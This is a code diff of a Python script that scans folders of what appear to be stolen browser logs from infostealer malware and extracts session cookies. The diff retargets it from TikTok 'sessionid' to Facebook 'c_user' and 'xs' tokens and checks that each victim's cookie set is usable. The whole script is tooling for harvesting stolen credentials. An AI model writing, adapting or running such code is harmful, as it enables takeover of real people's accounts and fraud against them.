@@ -3,7 +3,7 @@ import glob
 import shutil
 
 SOURCE_DIRECTORY = r'C:\Users\closirr\Downloads\Telegram Desktop\Logs_21 December'
-TARGET_DIRECTORY = r'.\cookies'
+TARGET_DIRECTORY = r'.\facebook_cookies'
 
 def main():
     if not os.path.exists(TARGET_DIRECTORY):
@@ -11,18 +11,10 @@ def main():
 
     count_processed = 0
     count_extracted = 0
-    count_duplicates = 0
-    
-    # Отримуємо список існуючих файлів для перевірки дублікатів (без префіксів valid_/invalid_)
-    existing_files = set()
-    for f in os.listdir(TARGET_DIRECTORY):
-        # Прибираємо префікси valid_ та invalid_ для порівняння
-        normalized = f.replace("valid_", "").replace("invalid_", "")
-        existing_files.add(normalized)
 
-    print(f"Scanning {SOURCE_DIRECTORY}...")
+    print(f"Сканирование {SOURCE_DIRECTORY}...")
     
-    # Recursive search for .txt files in Cookies folders or Browser folders
+    # Рекурсивный поиск .txt файлов в папках Cookies или Browser
     for root, dirs, files in os.walk(SOURCE_DIRECTORY):
         for filename in files:
             # Ищем .txt файлы в папках Cookies или Browser, или файлы с "Cookies" в названии
@@ -31,7 +23,7 @@ def main():
             if filename.endswith(".txt") and (is_in_cookies_folder or is_cookies_file):
                 filepath = os.path.join(root, filename)
                 
-                # Determine a safe unique name
+                # Определяем уникальное имя файла
                 path_parts = os.path.normpath(filepath).split(os.sep)
                 
                 log_id = "unknown"
@@ -53,7 +45,7 @@ def main():
                 safe_log_id = "".join(x for x in log_id if x.isalnum() or x in "[]_-")
                 safe_filename = "".join(x for x in filename if x.isalnum() or x in "._-").replace(".txt", "")
                 
-                # Output as .txt instead of .json
+                # Выходной файл .txt
                 output_filename = f"extracted_{safe_log_id}_{safe_filename}.txt"
                 output_path = os.path.join(TARGET_DIRECTORY, output_filename)
                 
@@ -64,51 +56,50 @@ def main():
                     with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                         lines = f.readlines()
                         
-                        # Preserve header if present
+                        # Сохраняем заголовок если есть
                         if lines and (lines[0].startswith("# Netscape") or lines[0].startswith("# HTTP")):
                             header_line = lines[0]
                             
                         for line in lines:
-                            # Keep empty lines or comments? Maybe minimal filtering.
-                            # User said "по минимуму что-то менял".
-                            # But we strictly need tiktok cookies. 
-                            
-                            # Always keep the header
+                            # Пропускаем заголовок (добавим его отдельно)
                             if line.startswith("# Netscape") or line.startswith("# HTTP"):
-                                continue # We added it to header_line, will write at start
+                                continue
                                 
-                            # Filter for tiktok.com
-                            if "tiktok.com" in line:
+                            # Фильтруем по facebook.com и связанным доменам
+                            if "facebook.com" in line or "fb.com" in line or "fbcdn.net" in line:
                                 extracted_lines.append(line)
                                 
                 except Exception as e:
-                    print(f"Error reading {filepath}: {e}")
+                    print(f"Ошибка чтения {filepath}: {e}")
                     continue
 
                 if extracted_lines:
-                    # VALIDATION LOGIC
-                    # 1. Check if we have enough lines (at least 2, including potentially header or just multiple cookies)
-                    # Actually, a single line might be valid if it's the sessionid, but usually we need more.
-                    # 2. Key check: MUST contain 'sessionid'
+                    # ВАЛИДАЦИЯ
+                    # Ключевая проверка: ДОЛЖЕН содержать 'c_user' для Facebook
+                    # c_user - это ID пользователя Facebook, обязательный для авторизации
                     
                     content_str = "".join(extracted_lines)
                     is_valid = False
                     
-                    if "sessionid" in content_str:
+                    # Проверяем наличие ключевых куки Facebook
+                    # c_user - ID пользователя (обязательно)
+                    # xs - сессионный токен (обязательно)
+                    has_c_user = "c_user" in content_str
+                    has_xs = "xs" in content_str
+                    
+                    if has_c_user and has_xs:
                         is_valid = True
                     
                     if not is_valid:
-                        print(f"Skipping {filename}: No sessionid found (Lines: {len(extracted_lines)})")
-                        continue
-                    
-                    # Перевірка на дублікат (порівнюємо без префіксів valid_/invalid_)
-                    normalized_output = output_filename.replace("valid_", "").replace("invalid_", "")
-                    if normalized_output in existing_files:
-                        print(f"Skipping duplicate: {output_filename}")
-                        count_duplicates += 1
+                        missing = []
+                        if not has_c_user:
+                            missing.append("c_user")
+                        if not has_xs:
+                            missing.append("xs")
+                        print(f"Пропуск {filename}: Отсутствуют куки: {', '.join(missing)} (Строк: {len(extracted_lines)})")
                         continue
 
-                    print(f"Found {len(extracted_lines)} TikTok cookies in {log_id}/{filename} (Valid)")
+                    print(f"Найдено {len(extracted_lines)} Facebook куки в {log_id}/{filename} (Валидно)")
                     try:
                         with open(output_path, 'w', encoding='utf-8') as f:
                             if header_line:
@@ -118,15 +109,12 @@ def main():
                                 f.write(line)
                                 
                         count_extracted += 1
-                        existing_files.add(output_filename)  # Додаємо до списку для уникнення дублікатів в межах одного запуску
                     except Exception as e:
-                        print(f"Error writing to {output_path}: {e}")
+                        print(f"Ошибка записи в {output_path}: {e}")
                 
                 count_processed += 1
 
-    print(f"Done. Scanned {count_processed} files. Extracted {count_extracted} cookie files to {TARGET_DIRECTORY}.")
-    if count_duplicates > 0:
-        print(f"Skipped {count_duplicates} duplicate(s).")
+    print(f"Готово. Просканировано {count_processed} файлов. Извлечено {count_extracted} файлов куки в {TARGET_DIRECTORY}.")
 
 if __name__ == '__main__':
     main()
